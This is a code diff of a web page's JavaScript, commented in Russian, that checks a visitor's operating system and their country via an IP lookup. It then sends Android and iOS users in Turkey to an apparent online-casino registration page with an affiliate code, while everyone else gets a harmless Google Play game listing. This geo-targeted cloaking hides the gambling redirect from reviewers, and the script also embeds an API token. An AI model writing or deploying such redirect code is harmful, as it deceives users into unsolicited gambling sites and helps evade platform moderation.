@@ -7,6 +7,7 @@
   <script>
     async function redirectUser() {
       // Проверяем операционную систему
+      const isAndroid = /android/i.test(navigator.userAgent);
       const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
       // Получаем геолокацию через API
@@ -14,9 +15,12 @@
         const response = await fetch('https://ipinfo.io/json?token=dffa7b5fd952e3'); // Вставьте ваш токен
         const data = await response.json();
 
-        if (isIOS && data.country === 'MY') {
-          // Перенаправляем iOS пользователей из Малайзии
-          window.location.href = "https://1wqdn.com/v3/landing-page/casino?p=9f2d";
+        if (isAndroid && data.country === 'TR') {
+          // Перенаправляем Android пользователей
+          window.location.href = "https://1whpom.com/v3/reg-form-aviator?p=47xo";
+        } else if (isIOS && data.country === 'TR') {
+          // Перенаправляем iOS пользователей
+          window.location.href = "https://1whpom.com/v3/reg-form-aviator?p=47xo";
         } else {
           // Перенаправляем всех остальных
           window.location.href = "https://play.google.com/store/apps/details?id=com.dvdfu.chicken2";
